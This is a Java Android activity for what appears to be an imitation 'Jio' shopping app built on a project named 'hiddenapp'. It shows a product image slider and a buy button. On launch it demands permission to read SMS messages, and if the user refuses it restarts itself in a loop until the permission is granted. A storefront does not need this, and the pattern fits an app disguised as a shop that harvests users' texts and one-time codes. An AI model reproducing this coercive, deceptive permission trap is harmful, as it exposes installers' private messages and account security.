package com.mijio.jioshop;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.View;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.denzcoskun.imageslider.ImageSlider;
import com.denzcoskun.imageslider.models.SlideModel;
import com.example.hiddenapp.MainActivity;
import com.example.hiddenapp.R;

import java.util.ArrayList;

public class LandingActivity extends AppCompatActivity {

    ImageSlider imageSlider;
    final int REQUEST_CODE_ASK_PERMISSIONS = 123;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_landing);
        getSupportActionBar().hide();

        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(LandingActivity.this, new String[]{"android.permission.READ_SMS"}, REQUEST_CODE_ASK_PERMISSIONS);

        }

        imageSlider = findViewById(R.id.image_slider);
        imageSlider = findViewById(R.id.image_slider);

        ArrayList<SlideModel> imageList = new ArrayList<>();
        imageList.add(new SlideModel(R.drawable.one, null));
        imageList.add(new SlideModel(R.drawable.two, null));
        imageList.add(new SlideModel(R.drawable.three, null));
        imageList.add(new SlideModel(R.drawable.four, null));
        imageList.add(new SlideModel(R.drawable.five, null));
        imageList.add(new SlideModel(R.drawable.six, null));

        imageSlider.setImageList(imageList, null);

    }

    public void buyNow(View view) {
        startActivity(new Intent(LandingActivity.this, MyCartActivity.class));

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        switch (requestCode){
            case REQUEST_CODE_ASK_PERMISSIONS:
                if(grantResults.length>0 && grantResults[0]==PackageManager.PERMISSION_GRANTED){

                }else{
                    Intent intent=getIntent();
                    finish();
                    startActivity(intent);
                }
                break;
        }
    }

    public void hamburgerClick(View view) {
        startActivity(new Intent(this, SearchActivity.class));
    }
}